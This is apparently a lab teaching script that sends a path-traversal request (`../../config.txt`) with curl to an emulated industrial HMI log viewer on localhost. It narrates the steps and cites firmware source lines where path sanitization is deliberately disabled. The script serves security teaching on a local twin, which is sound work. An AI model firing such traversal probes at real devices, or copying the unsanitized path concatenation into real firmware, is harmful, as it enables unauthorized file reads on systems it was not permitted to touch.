#!/usr/bin/env bash
# show-log-traversal.sh — probe the HMI log viewer with a path-traversal path (Part 6, Ex 2).
#
# Narrates each step so you learn WHILE it runs. Targets the QEMU twin's HMI on
# bridged port 8080 at 127.0.0.1 (boot it with ./qemu/run.sh). Physical hardware
# is reference/validation only.
#
#   ./firmware-ota/show-log-traversal.sh                     # default ../../config.txt probe
#   ./firmware-ota/show-log-traversal.sh ../../secret.txt    # try another relative path
HERE="$(cd "$(dirname "$0")" && pwd)"
source "$HERE/../tools/teach.sh" 2>/dev/null || true
type note >/dev/null 2>&1 || { step(){ printf '\n==== %s ====\n' "$*"; }; say(){ printf '» %s\n' "$*"; }; run(){ printf '   $ %s\n' "$*"; "$@"; }; observe(){ printf '→ %s\n' "$*"; }; predict(){ printf '? PREDICT FIRST: %s\n' "$*"; }; finding(){ printf '✎ FINDING: %s\n' "$*"; }; note(){ printf '   %s\n' "$*"; }; }
set -euo pipefail

PATHARG="${1:-../../config.txt}"
BASE="${HMI_URL:-http://127.0.0.1:8080}"
URL="$BASE/logs?file=$PATHARG"

step "Part 6 Ex 2 — probe the HMI log viewer with an un-sanitized traversal path"
say "Attacker's intent: the log viewer builds a file path straight from ?file=, so a '../'"
say "should let us step out of /logs and read arbitrary files."
predict "Will the server ACCEPT the '../' path verbatim? And if it does, does acceptance prove a file actually leaked?"

say "Send the traversal path (single-quoted URL so the shell leaves ../ and ? alone)."
run curl -s "$URL" || observe "(no response — is the twin running? '/logs' is on :8080)"
echo

observe "On the twin this returns 'File not found' — the emulated log store is empty,"
observe "so there is nothing outside /logs to exfiltrate here."
observe "OBSERVED: the path was accepted un-sanitized. NOT established: that a real file leaked."
observe "The weakness CLASS is proven by the SOURCE, not by this runtime response:"
note "define:    sbom/firmware/src/config.h:133   LOG_VIEWER_PATH_SANITIZE 0"
note "bad build: sbom/firmware/src/web_hmi.cpp:86  filepath = String(LOG_DIR) + \"/\" + filename;"
finding "Quote both source lines; state that 'accepted un-sanitized' is observed but 'file exfiltrated' is not."
